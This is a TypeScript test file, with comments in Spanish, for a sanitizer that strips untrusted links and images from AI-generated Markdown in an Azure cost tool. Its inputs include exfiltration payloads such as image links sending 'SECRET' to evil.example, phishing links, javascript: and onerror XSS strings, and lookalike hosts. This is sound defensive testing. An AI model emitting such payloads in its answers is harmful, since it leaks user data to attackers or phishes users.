// @vitest-environment node
import { describe, expect, it } from "vitest";
import { guardAiMarkdown } from "@/lib/aiOutputGuard";
import { isAllowedAiLink } from "@/lib/aiLinkPolicy";

// AISEC-02: ningún destino fuera de la allowlist sobrevive en el Markdown persistido.
const EVIL = "evil.example";

describe("isAllowedAiLink", () => {
  it.each([
    "https://learn.microsoft.com/azure/x",
    "https://portal.azure.com/#blade",
    "https://finops.cscloudsolutions.com.ar/es",
  ])("permite %s", (u) => expect(isAllowedAiLink(u)).toBe(true));

  it.each([
    "http://learn.microsoft.com/x",
    "https://learn.microsoft.com.evil.example/x",
    "https://evillearn.microsoft.com/x",
    "https://learn.microsoft.com@evil.example/x",
    "https://user:pw@learn.microsoft.com/x",
    "javascript:alert(1)",
    "data:text/html,x",
    "//evil.example",
    "/admin",
    "",
  ])("rechaza %s", (u) => expect(isAllowedAiLink(u)).toBe(false));
});

describe("guardAiMarkdown", () => {
  it.each([
    ["imagen inline", "Resumen ![ok](https://evil.example/c?d=SECRET) fin"],
    ["imagen con título", '![x](https://evil.example/?a=1 "t")'],
    ["imagen con <url>", "![x](<https://evil.example/?a=1>)"],
    ["imagen anidada", "![a [b] c](https://evil.example/?a=1)"],
    ["imagen por referencia", "![x][r]\n\n[r]: https://evil.example/?a=1"],
    ["enlace phishing", "[Renueve su licencia](https://evil.example/login)"],
    ["javascript:", "[a](javascript:alert(1))"],
    ["entidades en el destino", "[a](&#x68;ttps://evil.example)"],
    ["destino en otra línea", "[a](\n  https://evil.example)"],
    ["referencia", "[a][r]\n\n[r]: https://evil.example"],
    ["referencia con url en línea siguiente", "[a][r]\n\n[r]:\n  https://evil.example"],
    ["referencia en blockquote", "> [a][r]\n>\n> [r]: https://evil.example"],
    ["html img", '<img src="https://evil.example/x" onerror="alert(1)">'],
    ["html a", '<a href="https://evil.example">x</a>'],
    ["autolink", "<https://evil.example/x>"],
    ["url suelta", "visite https://evil.example/login ya"],
    ["www suelto", "visite www.evil.example ya"],
    ["comentario html", "<!-- ![x](https://evil.example) -->"],
    ["host parecido", "[a](https://learn.microsoft.com.evil.example/)"],
  ])("neutraliza: %s", (_n, md) => {
    const out = guardAiMarkdown(md);
    // Ningún destino de enlace/imagen ni autolink apunta al host malicioso.
    expect(out).not.toMatch(/\]\(\s*<?[^)]*evil\.example/);
    expect(out).not.toMatch(/^[ \t>]*\[[^\]]+\]:/m);
    expect(out).not.toMatch(/<[^>]*evil\.example/);
    expect(out).not.toMatch(/!\[/);
    expect(out).not.toMatch(/<img|<a\s/i);
    // URL suelta sólo puede quedar dentro de código (sin autolink).
    for (const m of out.matchAll(/(?:https?:\/\/|www\.)\S*evil\.example\S*/g)) {
      expect(out[m.index! - 1]).toBe("`");
    }
  });

  it("conserva enlaces permitidos, tablas y el resto del Markdown", () => {
    const md = [
      "## 1. Resumen",
      "| KPI | Valor |",
      "|---|---|",
      "| Gasto | $1,234.56 USD |",
      "",
      "Ver [docs](https://learn.microsoft.com/azure/cost-management \"t\") y https://portal.azure.com/x.",
      "**Ahorro**: 10% · `az vm list` · 2 < 3 > 1",
    ].join("\n");
    expect(guardAiMarkdown(md)).toBe(md);
  });

  it("es idempotente", () => {
    const md = "![x](https://evil.example) [a](https://evil.example) https://evil.example <b>x</b>";
    const once = guardAiMarkdown(md);
    expect(guardAiMarkdown(once)).toBe(once);
  });
});

describe("guardAiMarkdownStream (Copilot)", () => {
  const run = async (chunks: string[]) => {
    const src = new ReadableStream<string>({
      start(c) {
        chunks.forEach((x) => c.enqueue(x));
        c.close();
      },
    });
    let out = "";
    const r = src.pipeThrough((await import("@/lib/aiOutputGuard")).guardAiMarkdownStream()).getReader();
    for (;;) {
      const { done, value } = await r.read();
      if (done) return out;
      out += value;
    }
  };

  it("con cortes arbitrarios da lo mismo que filtrar el texto completo", async () => {
    const md = "## T\n\nHola ![x](https://evil.example/?d=1) y [a](\n https://evil.example)\n\n| a |\n|---|\n| [d](https://learn.microsoft.com/x) |\n\n[a][r]\n\n[r]: https://evil.example\n";
    for (const size of [1, 2, 3, 7, 16, md.length]) {
      const chunks = md.match(new RegExp(`[\\s\\S]{1,${size}}`, "g"))!;
      expect(await run(chunks)).toBe(guardAiMarkdown(md));
    }
  });
});
